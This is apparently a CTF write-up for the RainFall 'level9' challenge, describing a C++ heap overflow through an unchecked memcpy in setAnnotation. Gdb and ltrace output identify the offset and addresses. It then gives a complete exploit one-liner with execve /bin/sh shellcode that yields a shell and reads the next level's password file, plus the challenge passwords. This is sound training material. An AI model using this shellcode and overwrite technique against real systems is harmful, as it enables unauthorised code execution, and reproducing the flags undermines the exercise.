# **Level9**

## **Analysis**

**In `main()`:**
```cpp
    // At least one argument needed
	if (ac <= 1) {
		exit(1);
	}

    // Create two objects
	obj1 = new N(5);
	obj2 = new N(6);

    // Unprotected 'memset()'
	obj1->setAnnotation(av[1]);

    // Call to pointer to pointer of function
	(**fct)(obj2, &obj1);

	return 0;
```

___

## **Exploit**

Using the memcpy, we'll overwrite `**fct` to the adress of `N.str` which need to need to be the pointer to function which will point to our first shellcode instruction

Lets determine the offset to overwrite `**fct`
```
 ❯ python3 offset.py
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz%                            

(gdb) r AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
Starting program: /home/user/level9/level9 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Program received signal SIGSEGV, Segmentation fault.
(gdb) info register eax
eax            0x62626262       1650614882

 ❯ python3 offset.py 62
108
```

what's the adress of `N.str` ?
```
level9@RainFall:~$ ltrace ./level9 42
__libc_start_main(0x80485f4, 2, 0xbffff7f4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
_Znwj(108, 0xbffff7f4, 0xbffff800, 0xb7d79e55, 0xb7fed280) = 0x804a008
_Znwj(108, 5, 0xbffff800, 0xb7d79e55, 0xb7fed280)       = 0x804a078
strlen("42")                                            = 2
memcpy(0x0804a00c, "42", 2)                             = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c) = 0xb7fce4a0
+++ exited (status 11) +++
```

**Solution:**
 * (04) pointer to the first instruction of shell_code
 * (45) shell_code
 * (59) offset, 108 - 04 - 45
 * (04) return adress of memcpy

```
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x90" * 59 + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

___

*Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a*